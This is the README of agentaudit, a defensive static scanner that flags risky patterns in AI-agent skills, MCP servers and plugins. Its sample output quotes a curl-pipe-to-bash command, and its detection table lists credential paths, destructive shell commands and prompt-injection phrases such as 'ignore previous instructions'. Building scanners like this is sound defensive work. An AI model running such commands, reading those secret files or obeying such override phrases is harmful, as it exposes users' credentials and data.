# agentaudit

[![CI](https://github.com/mujinlabs/agentaudit/actions/workflows/ci.yml/badge.svg)](https://github.com/mujinlabs/agentaudit/actions/workflows/ci.yml)
[![PyPI](https://img.shields.io/pypi/v/mujin-agentaudit)](https://pypi.org/project/mujin-agentaudit/)
[![Python](https://img.shields.io/pypi/pyversions/mujin-agentaudit)](https://pypi.org/project/mujin-agentaudit/)
[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)

**Scan AI-agent extensions for security & quality risks *before* you install them.**

The agent ecosystem exploded — 21,000+ Claude Code skills, thousands of MCP
servers and plugins, spread across a dozen marketplaces. You install them with
one command and then hand them shell access, your env vars, and your repo.
**Almost none of them have been reviewed.** A single malicious skill can pipe a
remote script into your shell, read `~/.aws/credentials`, or hide instructions
that steer your agent behind your back.

`agentaudit` is a fast, local, dependency-free static auditor for that exact
problem. Point it at a skill / MCP server / plugin and it flags the patterns
that matter and gives you a score — in under a second, with nothing leaving
your machine.

```
$ agentaudit scan ./some-skill

CRITICAL AA001 remote-code-fetch
  SKILL.md:13
  Pipes a downloaded script straight into a shell (curl|bash style).
  > curl -s https://example-cdn.tld/setup.sh | bash
  → Never execute remote scripts blindly. Pin a version and review it first.

HIGH     AA050 prompt-injection
  SKILL.md:3
  Hidden/override instructions aimed at the agent.
  ...
────────────────────────────────────────────────────────
  Score  : 0/100  (grade F)
────────────────────────────────────────────────────────
```

## What it detects

| Category | Examples |
|---|---|
| **Remote code fetch** | `curl … \| bash`, `npx -y`, `pip install git+…` |
| **Secret access** | `~/.aws/credentials`, `~/.ssh`, `*_API_KEY`, browser cookie stores |
| **Network exfiltration** | hardcoded webhooks / pastebins / tunnels, raw outbound POSTs |
| **Obfuscation** | `exec(base64.b64decode(...))`, large encoded blobs |
| **Prompt injection** | "ignore previous instructions", "don't tell the user", zero-width unicode |
| **Shell / destructive ops** | `subprocess`, `rm -rf /`, `format`, `mkfs` |
| **Over-broad permissions** | wildcard tool grants, `bypassPermissions`, skip-permission flags |

Every finding points at an exact file and line so **you** make the call. The
rules are simple, transparent heuristics — false positives are expected; the
job is to surface what deserves a second look.

## Install

```bash
pipx install mujin-agentaudit      # recommended
# or
pip install mujin-agentaudit
```

Requires Python 3.9+. Zero dependencies. The installed command is **`agentaudit`**.

## Usage

```bash
agentaudit scan <path>                     # audit a directory or file
agentaudit scan <path> --format json       # machine-readable JSON
agentaudit scan <path> --format sarif      # SARIF 2.1.0 (GitHub code scanning)
agentaudit scan <path> --fail-on high      # exit non-zero for CI gating
```

`--fail-on` makes it a CI gate: drop it into the workflow that vendors or
updates an agent extension and block merges that introduce risky patterns.

## GitHub code scanning (SARIF)

`--format sarif` emits SARIF 2.1.0, so findings show up natively in GitHub's
**Security → Code scanning** tab and as inline PR annotations (and in any
SARIF-aware platform — GitLab, Azure DevOps, Sonar). Severities map to GitHub's
Critical/High/Medium/Low badges, and findings get stable fingerprints so a moved
line isn't re-reported as a new alert.

```yaml
# .github/workflows/extension-audit.yml
permissions:
  security-events: write     # required to upload SARIF
jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with: { python-version: "3.11" }
      - run: pipx install mujin-agentaudit
      - run: agentaudit scan ./skills --format sarif > agentaudit.sarif
      - uses: github/codeql-action/upload-sarif@v3
        with: { sarif_file: agentaudit.sarif }
```

## Why trust this (and how it stays honest)

agentaudit is **local and offline** — it reads files and prints results. It
never uploads what it scans. The full ruleset lives in
[`rules.py`](src/agentaudit/rules.py): no magic, no model, just heuristics you
can read and argue with. PRs that add rules (or fix false positives) are welcome.

## Roadmap

- ✅ SARIF output (v0.2) — GitHub Action listing next
- `--baseline` to suppress known/accepted findings
- More rule packs (MCP transport config, plugin manifest policy)
- Team policy files and a hosted dashboard *(planned paid tier — the CLI stays free and open)*

---

Built by **[Mujin Labs](https://github.com/mujinlabs)** — tools for the
autonomous-agent era. MIT licensed.
